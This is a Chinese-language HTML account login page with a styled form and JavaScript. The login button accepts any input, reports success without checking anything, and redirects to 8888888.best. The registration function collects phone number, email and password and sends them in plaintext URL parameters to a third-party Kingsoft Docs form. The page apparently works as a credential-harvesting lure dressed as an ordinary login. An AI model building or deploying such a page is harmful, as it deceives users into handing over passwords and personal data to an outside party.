<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>账号登录</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            min-height:100vh;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            display:flex;align-items:center;justify-content:center;
            font-family:"Microsoft Yahei",sans-serif;
        }
        .login-box{
            background:#fff;padding:50px 40px;border-radius:20px;
            width:90%;max-width:460px;box-shadow:0 10px 40px rgba(0,0,0,0.15);
        }
        h2{text-align:center;margin-bottom:40px;color:#222;font-weight:600;}
        .item{margin-bottom:25px;}
        label{display:block;margin-bottom:8px;color:#555;font-size:15px;}
        input{
            width:100%;padding:14px 16px;border:1px solid #ddd;
            border-radius:8px;font-size:16px;outline:none;transition:0.3s;
        }
        input:focus{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.15);}
        .forget-link{text-align:right;margin:-8px 0 30px 0;}
        .forget-link a{color:#667eea;text-decoration:none;font-size:14px;}
        .login-btn{
            width:100%;padding:15px;border:none;border-radius:8px;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            color:white;font-size:17px;cursor:pointer;transition:0.3s;
        }
        .login-btn:hover{opacity:0.9;}
        .reg-text{text-align:center;margin-top:25px;color:#666;font-size:15px;}
        .reg-text a{color:#667eea;text-decoration:none;}
    </style>
</head>
<body>
<div class="login-box">
    <h2>账号登录</h2>

    <div class="item">
        <label>手机号</label>
        <input type="text" id="phone" placeholder="请输入手机号">
    </div>
    <div class="item">
        <label>邮箱</label>
        <input type="text" id="email" placeholder="请输入邮箱">
    </div>
    <div class="item">
        <label>登录密码</label>
        <input type="password" id="pwd" placeholder="请设置登录密码">
    </div>

    <div class="forget-link">
        <a href="javascript:alert('请联系管理员重置密码')">忘记密码？</a>
    </div>

    <button class="login-btn" onclick="userLogin()">立即登录</button>

    <div class="reg-text">
        还没有账号？ <a href="javascript:userRegister()">立即注册</a>
    </div>
</div>

<script>
// 登录跳转
function userLogin() {
    let phone = document.getElementById("phone").value.trim();
    let email = document.getElementById("email").value.trim();
    let pwd = document.getElementById("pwd").value.trim();

    if (!phone || !email || !pwd) {
        alert("请完整填写手机号、邮箱和密码");
        return;
    }

    alert("✅ 登录成功！");
    location.href = "https://8888888.best/index.html";
}

// 注册 完整3字段 精准匹配金山表单
function userRegister() {
    let phone = prompt("请输入【手机号】：");
    if (!phone) { alert("手机号必填！"); return; }

    let email = prompt("请输入【邮箱地址】：");
    if (!email) { alert("邮箱必填！"); return; }

    let pwd = prompt("请设置【登录密码】：");
    if (!pwd || pwd.length < 6) { alert("密码至少6位！"); return; }

    // 精准对应你表单的3个必填题项，顺序完全一致
    const formBase = "https://f.kdocs.cn/g/dlLFQoSv/";
    const submitUrl = `${formBase}?1=${encodeURIComponent(phone)}&2=${encodeURIComponent(email)}&3=${encodeURIComponent(pwd)}`;

    alert("注册信息已填写，新开页面点击【提交】即可完成注册！");
    // 新开标签页，自动填好全部3项，用户仅需点提交
    window.open(submitUrl, "_blank");
}
</script>
</body>
</html>
